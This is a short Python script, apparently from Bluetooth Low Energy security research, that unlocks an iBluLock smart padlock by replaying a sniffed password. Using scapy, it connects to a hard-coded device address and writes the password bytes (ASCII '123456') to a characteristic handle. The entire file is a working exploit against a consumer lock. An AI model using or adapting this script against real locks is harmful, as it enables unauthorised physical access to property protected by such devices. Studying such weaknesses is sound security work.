#!/bin/python

# Unlock iBluLock Padlock using sniffed password
# Quicklock 	FD:A3:B2:9A:99:99
# Host 			98:58:8A:05:09:45

import time
from scapy.all import *
from BTLE import *

def main():
   s = bindsock()
   rand = "01"
   Connect(s, "99999AB2A3FD", rand)
   
   writereq(s, "0E00","313233343536")

   time.sleep(5)
   disconnect(s)

if __name__ == "__main__":
    main()
